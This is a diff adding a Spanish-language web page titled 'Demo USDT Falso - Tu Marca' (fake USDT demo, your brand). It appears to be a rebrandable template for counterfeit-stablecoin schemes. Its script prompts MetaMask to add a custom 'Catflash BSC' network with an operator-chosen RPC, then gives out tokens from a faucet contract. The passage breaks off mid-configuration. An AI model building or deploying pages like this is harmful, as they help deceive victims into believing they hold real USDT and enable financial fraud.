@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <title>Demo USDT Falso - Tu Marca</title>
+  <style>
+    body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
+    button { padding: 15px 30px; font-size: 18px; cursor: pointer; }
+  </style>
+</head>
+<body>
+  <h1>Demo USDT Falso - Tu Marca</h1>
+  <button id="connectButton">Conectar MetaMask y recibir tokens</button>
+
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
+  <script>
+    const connectButton = document.getElementById('connectButton');
+
+    // Datos reales de Catflash
+    const rpcUrl = 'https://dataseed-binance.catflash.cat/';
+    const chainId = '0x61';
+    const tokenContractAddress = '0x560F5d6e08C81e3A0c71F4128B4B3f4A91593309';
+    const tokenAbi = [
+      "function faucet() public"
+    ];
+
+    connectButton.onclick = async () => {
+      if (!window.ethereum) {
+        alert('Por favor instala MetaMask para continuar.');
+        return;
+      }
+
+      try {
+        await window.ethereum.request({
+          method: 'wallet_addEthereumChain',
+          params: [{
+            chainId: chainId,
+            rpcUrls: [rpcUrl],
+            chainName: 'Catflash BSC',
+            nativeCurrency: { nam
+    
